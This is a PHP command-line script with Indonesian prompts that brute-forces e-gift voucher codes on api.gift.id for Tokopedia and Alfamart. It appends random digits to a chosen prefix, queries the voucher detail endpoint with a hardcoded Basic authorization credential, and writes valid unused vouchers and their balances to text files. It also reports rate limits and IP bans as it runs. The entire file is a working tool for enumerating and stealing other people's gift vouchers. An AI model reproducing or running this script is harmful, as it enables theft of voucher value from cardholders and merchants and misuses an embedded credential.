<?php
// @RiyanCoday //
function read ($length='255') 
{ 
   if (!isset ($GLOBALS['StdinPointer'])) 
   { 
      $GLOBALS['StdinPointer'] = fopen ("php://stdin","r"); 
   } 
   $line = fgets ($GLOBALS['StdinPointer'],$length); 
   return trim ($line); 
}

echo "Awalannya Bos Coday ? ";
$code = read();
echo "Tokopedia[1] atau Alfamart[2] Bos Coday ? ";
$type = read();
echo "Tampilkan DIE Bos Coday ? 1=iya 0=tidak ";
$die = read();
date_default_timezone_set("Asia/Jakarta");
error_reporting(0);
class curl {
	var $ch, $agent, $error, $info, $cookiefile, $savecookie;	
	function curl() {
		$this->ch = curl_init();
		curl_setopt ($this->ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36');
		curl_setopt ($this->ch, CURLOPT_HEADER, 1);
		curl_setopt ($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($this->ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt ($this->ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt ($this->ch, CURLOPT_FOLLOWLOCATION,true);
		curl_setopt ($this->ch, CURLOPT_TIMEOUT, 30);
		curl_setopt ($this->ch, CURLOPT_CONNECTTIMEOUT,30);
	}
	function header($header) {
		curl_setopt ($this->ch, CURLOPT_HTTPHEADER, $header);
	}
	function timeout($time){
		curl_setopt ($this->ch, CURLOPT_TIMEOUT, $time);
		curl_setopt ($this->ch, CURLOPT_CONNECTTIMEOUT,$time);
	}
	function http_code() {
		return curl_getinfo($this->ch, CURLINFO_HTTP_CODE);
	}
	function error() {
		return curl_error($this->ch);
	}
	function ssl($veryfyPeer, $verifyHost){
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, $veryfyPeer);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, $verifyHost);
	}
	function post($url, $data) {
		curl_setopt($this->ch, CURLOPT_POST, 1);	
		curl_setopt($this->ch, CURLOPT_POSTFIELDS, $data);
		return $this->getPage($url);
	}
	function data($url, $data, $hasHeader=true, $hasBody=true) {
		curl_setopt ($this->ch, CURLOPT_POST, 1);
		curl_setopt ($this->ch, CURLOPT_POSTFIELDS, http_build_query($data));
		return $this->getPage($url, $hasHeader, $hasBody);
	}
	function get($url, $hasHeader=true, $hasBody=true) {
		curl_setopt ($this->ch, CURLOPT_POST, 0);
		return $this->getPage($url, $hasHeader, $hasBody);
	}	
	function getPage($url, $hasHeader=true, $hasBody=true) {
		curl_setopt($this->ch, CURLOPT_HEADER, $hasHeader ? 1 : 0);
		curl_setopt($this->ch, CURLOPT_NOBODY, $hasBody ? 0 : 1);
		curl_setopt ($this->ch, CURLOPT_URL, $url);
		$data = curl_exec ($this->ch);
		$this->error = curl_error ($this->ch);
		$this->info = curl_getinfo ($this->ch);
		return $data;
	}
}
$curl = new curl();
$curl->ssl(0, 2);
$headers = array();
$headers[] = "Authorization: Basic cE0wNjMyMm5uQUhEU2VpZHpUdkFOczVIMzpVeWdJZHR6VXEzVlNjb1Y3RThXVW9ub1RDaWg1QmdwYnNsdjZPcHNKTzlFQWtMSEV5VQ==";
$curl->header($headers);	
$i =-1;
while (true) {
	if($type == 1){
		$type = 8346;
	}else{
		$type = 1662;
	}
	$asw = ''.$code.''.rand(0,9).''.rand(0,9).''.rand(0,9).''.rand(0,9).''.rand(0,9).''.rand(0,9).'';
	$page = $curl->get('https://api.gift.id/v1/egifts/detail/'.$type.'/'.$asw.'');
//echo $page;
	if (stripos($page, 'number')) {
		preg_match_all('/"number":"(.*?)","amount"/', $page, $tada);
		preg_match_all('/"amount":(.*?),"status"/', $page, $bl);
				preg_match_all('/"brand":"(.*?)",/', $page, $x);
								preg_match_all('/"code":"(.*?)","usedAt"/', $page, $codes);
								preg_match_all('/"expiredAt":"(.*?)T/', $page, $t);
						preg_match_all('/"usedAt":(.*?),"expiredAt"/', $page, $use);
								$vocexp = "".$t[1][0];
$today = date('Y-m-d');
if($vocexp > $today){
			if($use[1][0] =="null"){
							echo "MANTAP KALI => ".$codes[1][0]." ".$asw." (".$bl[1][0].")  ".$x[1][2]."";
$data =  "".$codes[1][0]." / ".$bl[1][0]." / ".$asw." / ".$x[1][2]." / \r\n";
		$fh = fopen("".$code."_".$type.".txt", "a");
		fwrite($fh, $data);
		fclose($fh);
			}else{
							echo "LIVE => ".$asw." (".$bl[1][0].") ".$x[1][2]."";
$data =  "".$tada[1][1]." / ".$bl[1][0]." / ".$asw." / ".$x[1][2]." / \r\n";
		$fh = fopen("cdy-".$code."_".$type.".txt", "a");
		fwrite($fh, $data);
		fclose($fh);
				}
		echo "\n";
		flush();
		ob_flush();

}else{
			echo "EXP => ".$asw;
		echo "\n";		flush();
		ob_flush();
}
	} elseif (stripos($page, 'eVoucher not found')) {
		if($die == 1){
		echo "".i."DIE => ".$asw;		echo "\n";	
		}
		flush();
		ob_flush();
time_nanosleep(0, 300000000);		
	}elseif (stripos($page, 'TooManyRequest')) {
		echo "TOO MANY REQUEST : ".$asw;
		echo "\n";		flush();
		ob_flush();
	}elseif (stripos($page, 'has banned your IP address')) {
			echo "BANNED : ".$asw;
		echo "\n";		exit();
	}else{
		echo "ERROR : ".$asw;
		echo "\n";		flush();
		ob_flush();
	} $i++;
}
?>
